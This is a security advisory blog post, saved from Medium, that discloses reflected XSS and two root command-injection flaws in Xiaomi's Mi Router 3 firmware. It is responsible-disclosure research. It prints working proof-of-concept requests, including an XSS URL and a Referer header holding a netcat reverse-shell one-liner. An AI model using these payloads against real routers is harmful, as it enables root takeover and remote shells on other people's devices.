=== Content from blog.securityevaluators.com_e055d1a6_20250124_152052.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F1d7fd42f0838&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Hack Routers, Get Toys: Exploiting the Mi Router 3

## ISE Labs discovers XSS, command injection in Xiaomi’s router

[![Shaun Mirani](https://miro.medium.com/v2/resize:fill:88:88/1*DlgcXPRznKjNV1z1X24iXw.png)](https://medium.com/%40smirani?source=post_page---byline--1d7fd42f0838--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:48:48/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---byline--1d7fd42f0838--------------------------------)

[Shaun Mirani](https://medium.com/%40smirani?source=post_page---byline--1d7fd42f0838--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd57ec8ea0ef1&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&user=Shaun+Mirani&userId=d57ec8ea0ef1&source=post_page-d57ec8ea0ef1--byline--1d7fd42f0838---------------------post_header-----------)

Published in[Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---byline--1d7fd42f0838--------------------------------)·3 min read·Nov 6, 2018

--

Listen

Share

The Mi Router 3 is a popular SOHO device developed by Xiaomi. This summer, we at ISE Labs performed a security assessment of this router, in which we uncovered 3 vulnerabilities: an instance of reflected XSS and two command injection issues that lead to code execution as root (an exploitation guide on the latter will come in another blog post). All bugs described here were found in version 2.22.15 of the firmware.

For our effort in finding these flaws and privately disclosing them, Xiaomi inducted us into their [Hall of Fame](https://sec.xiaomi.com/fame) and even sent us bunny plush toy, depicted in the figure below. We have not removed the doll from its packaging as we don’t want to tarnish its pristine condition.

![]()
# Reflected Cross-Site Scripting (CVE-2018-13022)

Certain malformed requests to the device’s `misystem` API generate a 404 Not Found error with the request URL reflected in the error body. Although this page is served as `text/plain`, the lack of an `X-Content-Type-Options: nosniff` header may result in certain web browsers, such as Internet Explorer, interpreting the page as HTML. As a result, an attacker may execute reflected cross-site scripting (XSS) attacks via these error pages. An example URL is provided below.

```
http://192.168.31.1/cgi-bin/luci/;/api/misystem/status<script>alert(‘c%3a’)</script>
```
![]()
# Command Injection in wifi\_access Functionality (CVE-2018-13023)

The endpoint `/cgi-bin/luci/;stok=<stok>/api/misns/wifi_access` passes several URL parameters as the arguments to a shell command. However, the application backend does not sufficiently validate or sanitize some of these parameters to prevent attackers from breaking out of the command and supplying their own. Authenticated users can therefore run arbitrary system commands on the router with root privileges. The request below demonstrates this attack via the `sns` parameter:

```
GET /cgi-bin/luci/;stok=88de3a3ba0e9a64f50124fbf669f088f/api/misns/wifi_access?mac=00:00:00:00:00:00&sns='%0atouch%09/tmp/wawa%0a%23&grant=1&guest_user_id=guid&timeout=timeout HTTP/1.1
Host: 192.168.31.1
```
# Command Injection in Mi TV Integration (CVE-2018-16130)

The endpoint `/cgi-bin/luci/;stok=<stok>/api/xqsmarthome/request_mitv` is used for requesting media to play on a Mi TV. It accepts a JSON-formatted URL parameter called payload and uses the values therein to construct a shell command. However, the application backend does not sufficiently validate or sanitize some of the supplied data to prevent attackers from including command substitution syntax. Authenticated users can therefore run arbitrary system commands on the router with root privileges. The request below demonstrates this attack via the `url` JSON field:

```
GET /cgi-bin/luci/;stok=e1ec152fe4b3a17fdff58dcc960529ed/api/xqsmarthome/request_mitv?payload={“ip”%3a”127.0.0.1",”command”%3a”video_playurl”,”url”%3a”$(eval$IFS$HTTP_REFERER)”} HTTP/1.1
Referer: mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc $REMOTE_ADDR 9001 >/tmp/p
Host: 192.168.31.1
```
# Disclosure Timeline

* **June 19, 2018:** Sent vulnerability details to Xiaomi
* **June 20, 2018:** Xiaomi Security Center verified issues and thanked us

[Shaun Mirani](https://medium.com/%40smirani), Junior Security Analyst @ [Independent Security Evaluators](http://www.securityevaluators.com)

[**Sign up to get our latest blogs.**](http://eepurl.com/bLc2bf)

[Security](https://medium.com/tag/security?source=post_page-----1d7fd42f0838--------------------------------)[IoT](https://medium.com/tag/iot?source=post_page-----1d7fd42f0838--------------------------------)[Hacking](https://medium.com/tag/hacking?source=post_page-----1d7fd42f0838--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----1d7fd42f0838--------------------------------)[Ise Labs](https://medium.com/tag/ise-labs?source=post_page-----1d7fd42f0838--------------------------------)

--

--

[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:96:96/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--1d7fd42f0838--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:128:128/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--1d7fd42f0838--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--1d7fd42f0838---------------------follow_profile-----------)[## Published in Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---post_publication_info--1d7fd42f0838--------------------------------)[1K Followers](/followers?source=post_page---post_publication_info--1d7fd42f0838--------------------------------)·[Last published Mar 7, 2022](/reading-hackable-without-a-background-in-security-a22ebe59b3e8?source=post_page---post_publication_info--1d7fd42f0838--------------------------------)

Security specialists that provide custom services including security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers and hacking contests.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--1d7fd42f0838---------------------follow_profile-----------)[![Shaun Mirani](https://miro.medium.com/v2/resize:fill:96:96/1*DlgcXPRznKjNV1z1X24iXw.png)](https://medium.com/%40smirani?source=post_page---post_author_info--1d7fd42f0838--------------------------------)[![Shaun Mirani](https://miro.medium.com/v2/resize:fill:128:128/1*DlgcXPRznKjNV1z1X24iXw.png)](https://medium.com/%40smirani?source=post_page---post_author_info--1d7fd42f0838--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd57ec8ea0ef1&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&user=Shaun+Mirani&userId=d57ec8ea0ef1&source=post_page-d57ec8ea0ef1--post_author_info--1d7fd42f0838---------------------follow_profile-----------)[## Written by Shaun Mirani](https://medium.com/%40smirani?source=post_page---post_author_info--1d7fd42f0838--------------------------------)[27 Followers](https://medium.com/%40smirani/followers?source=post_page---post_author_info--1d7fd42f0838--------------------------------)·[1 Following](https://medium.com/%40smirani/following?source=post_page---post_author_info--1d7fd42f0838--------------------------------)

Security Analyst at ISE

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd57ec8ea0ef1&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fhack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838&user=Shaun+Mirani&userId=d57ec8ea0ef1&source=post_page-d57ec8ea0ef1--post_author_info--1d7fd42f0838---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----1d7fd42f0838--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----1d7fd42f0838--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----1d7fd42f0838--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----1d7fd42f0838--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----1d7fd42f0838--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----1d7fd42f0838--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----1d7fd42f0838--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----1d7fd42f0838--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----1d7fd42f0838--------------------------------)[Teams](https://medium.com/business?source=post_page-----1d7fd42f0838--------------------------------)


